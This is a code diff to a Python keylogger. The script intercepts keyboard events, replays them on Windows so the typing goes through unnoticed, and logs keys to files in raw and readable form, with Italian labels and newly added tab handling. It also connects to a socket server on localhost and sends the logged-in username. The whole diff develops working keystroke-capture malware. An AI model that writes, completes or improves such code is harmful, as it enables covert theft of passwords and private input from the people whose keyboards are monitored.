@@ -3,6 +3,7 @@ from datetime import datetime
 import threading
 import getpass
 import socket
+import platform
 
 client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    
 server_address = ('localhost', 12345)
@@ -10,13 +11,16 @@ client_socket.connect(server_address)
 client_socket.sendall(str(getpass.getuser()).encode())
 
 evento = threading.Event()
+windows=False
+if platform.system() == 'Windows':
+    windows=True
 
 def recording():
     msg = keyboard.read_event(suppress=True)
-    l = list()
-    l.append(msg)
-    keyboard.play(l)
-    
+    if windows:
+        l = list()
+        l.append(msg)
+        keyboard.play(l)
     return msg
 
 def writeToFileRaw(lPath, lName, l):    
@@ -47,6 +51,8 @@ def writeToFileHuman(strh):
             strh = " [MAIUSCOLO] "
         elif strh.find("space") != -1:
             strh = " "
+        elif strh.find("tab") != -1:
+            strh = " [TAB] "
         else:
             strh = strh.removeprefix("KeyboardEvent(")
             strh = strh.removesuffix(" down)\n")
